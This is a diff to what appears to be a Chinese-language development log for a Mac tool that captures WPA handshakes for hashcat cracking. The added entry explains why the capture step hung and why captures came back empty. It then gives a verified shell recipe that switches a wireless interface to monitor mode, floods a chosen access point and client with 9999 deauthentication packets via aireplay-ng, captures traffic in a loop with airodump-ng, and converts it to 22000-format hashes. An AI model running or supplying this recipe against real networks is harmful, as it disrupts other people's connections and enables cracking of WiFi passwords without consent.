@@ -68,6 +68,26 @@ Mac 抓 EAPOL (monitor mode)  →  hcxpcapngtool  →  .hc22000 (m=22000 hash)
 - **Mac 125 檔案**：`/tmp/alpine-root.qcow2`（512M ext4 UUID b016ed7f）、`/tmp/irfs-wifi/`（initramfs 源）、`/tmp/initramfs-custom`（~30MB）、`/tmp/mac_capture_app.py` + `~/Desktop/MacCapture.app/Contents/Resources/mac_capture_app.py`、`/tmp/mac_test_harness.py`。
 - **待做**：(a) 更長 capture（5-10 min）提高 PMKSA 命中；(b) 驗證 Windows:8766 收到 hash + hashcat 接續；(c) push GitHub。
 
+## ⏱ 2026-09-13 ✅ 抓包步驟「卡死」根因定位 + 修正（capture 完整跑通）
+- **症狀**：Mac app 點目標抓包後，[2/5] SSH 抓包那步 **卡死**（subprocess.run 永遠不回來），[3/5]~[5/5] 沒完成。
+- **根因 1（卡死）**：`nohup aireplay-ng ... &` 的背景 deauth storm 持有 SSH session 的 stdin pipe；迴圈結束後 `pkill aireplay-ng` 用 **SIGTERM**，但 deauth 迴圈可能忽略 SIGTERM → pipe 沒 EOF → SSH channel 不關 → Mac 端 `communicate()`/`poll` 永遠等。
+  - **修正**：`pkill -9 aireplay-ng`（SIGKILL 一定殺得掉，釋放 pipe）。
+- **根因 2（cap 0 bytes）**：設 monitor mode 前沒先 `ifconfig wlan0 down` → `iw dev wlan0 set type monitor` 報 **`Resource busy (-16)`** → wlan0 其實還在 managed → airodump 抓不到任何封包（cap 0 / 24 bytes）。
+  - **修正**：`ifconfig wlan0 down` → `iw dev wlan0 set type monitor` → `ifconfig wlan0 up`。實測 monitor 正確後 airodump 10s 抓 **233KB**、4 輪共 **680KB**（ch1 有大量 AP，beacon+data 都有）。
+- **誤判排除**：一度以為 SIGTERM 不 flush cap → 改用「q 鍵正常退出」（`( sleep 10; printf q ) | airodump-ng`）；但 deauth storm 運行時 airodump **讀不到 q 鍵就無限跑**（卡 3 分半）。改回 `timeout 10 airodump-ng`（SIGTERM）+ 正確 monitor mode → cap 正常 flush。**SIGTERM 本來就不是問題，Resource busy 才是。**
+- **最終 VM capture recipe（已驗證 47.7s 乾淨回傳）**：
+  ```sh
+  ifconfig wlan0 down; iw dev wlan0 set type monitor; ifconfig wlan0 up; sleep 2
+  pkill -9 -f "airodump-ng|aireplay-ng"; sleep 1; rm -f /tmp/capapp*
+  nohup aireplay-ng --deauth 9999 --ignore-negative-one -a <BSSID> -c <client> wlan0 < /dev/null > /dev/null 2>&1 &
+  sleep 3
+  nruns=$((dur/10)); for i in $(seq 1 $nruns); do timeout 10 airodump-ng -w /tmp/capapp -c <ch> wlan0 > /dev/null 2>&1; done
+  pkill -9 aireplay-ng   # SIGKILL 釋放 SSH pipe，防卡死
+  ls /tmp/capapp-*.cap | xargs hcxpcapngtool -o /tmp/capapp.22000
+  ```
+- **實測**：`/tmp/captest3.py`（45s）→ **ELAPSED 47.7s（不卡死）**、**4 cap 檔 / 680KB**、hcxpcapngtool **processed cap files: 4**、22000 = 0 hash（PMKSA 快取重連，capture 無 EAPOL/PMKID）。**卡死已解**；hash 命中仍靠 PMKSA（待更長 capture）。
+- **已同步**：修正版 `mac_capture_app.py` → `~/Desktop/MacCapture.app/Contents/Resources/`（MAC_COMPILE_OK）。
+
 ## ⏱ 2026-09-12 EAPOL 抓包 bug 修復 + 工作中的 capture recipe (32H10F, ch1)
 
 ### 🐛 找到的 bug（關鍵）
